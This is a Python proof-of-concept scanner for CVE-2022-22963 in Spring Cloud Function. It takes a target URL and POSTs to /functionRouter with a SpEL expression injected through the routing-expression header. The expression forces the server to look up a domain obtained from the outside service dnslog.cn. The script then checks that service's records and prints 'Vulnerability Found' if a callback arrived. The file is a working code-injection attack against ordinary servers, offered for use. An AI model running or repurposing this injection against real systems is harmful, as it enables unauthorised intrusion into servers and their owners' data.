import requests
import json
import argparse

BLUE = "\033[0;34m"
BROWN = "\033[0;33m"
RED = "\033[0;31m"
LIGHT_GREEN = "\033[1;32m"
END = "\033[0m"

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    help="Enter the Url")
args = parser.parse_args()

print(f"{BLUE}[-]Searching for CVE-2022-22963{END}\n")

def dns_log_domain():
    session = requests.Session()
    domain = session.get('http://www.dnslog.cn/getdomain.php')
    global cookies
    cookies = {'PHPSESSID': domain.cookies['PHPSESSID']}
    return domain.text

def dns_log_log():
    session = requests.Session()
    log = session.get('http://www.dnslog.cn/getrecords.php', cookies=cookies, timeout=2)
    return log.text



do = dns_log_domain()

mainurl = args.url

def main(do, url):
    gr = f'T(java.net.InetAddress).getByName("{do}")'
    hh = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
        'spring.cloud.function.routing-expression':gr
    }
    dd = "agun"
    r = requests.post(url+"/functionRouter", headers=hh, data=dd)
    

main(do, mainurl)

leng = len(dns_log_log())

if leng > 2:
    print(f"{BROWN}[-]Vulnerability Found{END} \n")
    print(f"{RED}[vuln]{END} {LIGHT_GREEN}"+mainurl)
else:
    print("Site is not Vulnerable")
